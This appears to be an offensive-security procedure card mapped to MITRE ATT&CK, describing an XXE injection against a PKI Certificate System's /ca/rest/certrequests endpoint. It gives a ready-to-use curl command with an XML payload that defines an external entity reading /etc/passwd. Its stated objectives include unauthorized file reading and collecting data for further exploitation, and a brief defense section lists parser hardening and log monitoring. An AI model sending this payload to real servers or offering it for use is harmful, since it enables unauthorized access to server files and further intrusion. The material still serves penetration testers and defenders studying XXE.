---
tags:
  - xxe
  - file-disclosure
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-xxe-payload-post]]'
platforms:
  - Web
  - Linux
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: eeb8b76a-caf1-4d1e-a30d-2dffcf234c36
created_at: '2025-12-13T09:00:27.812Z'
updated_at: '2025-12-13T09:00:27.812Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# XXE Injection to Read Server Files

## Summary

This procedure exploits an XML External Entity (XXE) injection vulnerability in a web application's certificate enrollment endpoint to read arbitrary files on the server, such as /etc/passwd, by injecting a malicious XML payload that defines and references external entities.

## Description

The attack targets the /ca/rest/certrequests endpoint of a PKI Certificate System running on Apache and Tomcat. By sending a crafted XML payload in a POST request, the improperly configured XML parser processes external entities, allowing file disclosure. This can lead to confidentiality breaches, potential SSRF, DoS, or rare RCE. The procedure assumes unauthenticated access to the endpoint.

## Requirements

1. Network access to the target endpoint (/ca/rest/certrequests)
2. Tool for sending HTTP POST requests with XML content (e.g., curl)
3. Knowledge of target file paths (e.g., /etc/passwd)

## Defense

Defensive measures and detection strategies:

- Disable external entity processing in XML parsers (e.g., set DocumentBuilderFactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true))
- Validate and sanitize all XML inputs
- Monitor for suspicious HTTP requests containing DOCTYPE declarations or entity references in logs

## Objectives

1. Achieve unauthorized reading of server files
2. Demonstrate XXE vulnerability impact
3. Collect sensitive data for further exploitation

## Instructions

### Step 1: Craft and Send XXE Payload

**Context**: Construct a malicious XML payload that defines an external entity referencing a local file and inject it into the request to force the server to include the file contents in its response.

**Command** ([[commands/curl-xxe-payload-post]]):
```bash
curl -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><CertEnrollmentRequest><ProfileID>&xxe;</ProfileID></CertEnrollmentRequest>' https://target.com/ca/rest/certrequests
```

> This command sends the XML with an entity that reads /etc/passwd and embeds it in the ProfileID element. The server processes it due to vulnerable parsing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-xxe-payload-post]]

## Tools Used



## Tags

- [[xxe]]
- [[file-disclosure]]
